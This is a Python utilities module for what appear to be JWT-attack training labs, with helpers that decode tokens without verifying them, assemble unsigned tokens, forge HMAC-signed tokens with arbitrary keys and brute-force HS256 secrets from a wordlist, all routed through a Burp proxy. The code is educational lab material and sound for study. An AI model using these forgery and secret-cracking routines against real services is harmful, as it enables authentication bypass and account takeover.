"""
utils.py — shared helpers for the JWT Attacks module labs.

📝 Note: these labs are mostly about forging/tampering with a token client-side
and resending it — no browser/victim interaction needed, unlike OAuth. That
means every lab script here is fully runnable end-to-end once TARGET is set.

Requires: pip install requests pyjwt cryptography --break-system-packages
"""

import base64
import hashlib
import hmac
import json

import requests

from proxies import BURP_PROXIES, VERIFY_SSL


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def b64url_encode(data: bytes) -> str:
    """Base64url, no padding — the encoding JWTs actually use."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padded = data + "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(padded)


def decode_jwt(token):
    """Decode header + payload WITHOUT verifying the signature. Read-only inspection."""
    parts = token.split(".")
    if len(parts) < 2:
        return None, None
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload


def build_unverified_token(header: dict, payload: dict, signature: bytes = b"") -> str:
    """
    Assemble header.payload.signature from scratch — gives us full control over
    every byte, which library helpers like PyJWT sometimes normalize away.
    """
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def sign_hs256(message: str, key: bytes) -> bytes:
    """Raw HMAC-SHA256 signing — used both legitimately and for key-confusion attacks."""
    return hmac.new(key, message.encode(), hashlib.sha256).digest()


def forge_hs256_token(header: dict, payload: dict, key: bytes) -> str:
    """Build and HMAC-sign a token with an arbitrary (e.g. brute-forced or leaked) key."""
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = sign_hs256(f"{h}.{p}", key)
    return f"{h}.{p}.{b64url_encode(sig)}"


def brute_force_hs256_key(token: str, wordlist_path: str):
    """
    Try every line of a wordlist as the HMAC secret until one produces a
    matching signature. Use with a short list (e.g. SecLists jwt-secrets.txt) —
    this is pure CPU, no network calls, so it's fast locally.
    """
    h, p, sig_b64 = token.split(".")
    target_sig = b64url_decode(sig_b64)
    message = f"{h}.{p}"

    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            if hmac.compare_digest(sign_hs256(message, candidate.encode()), target_sig):
                return candidate
    return None
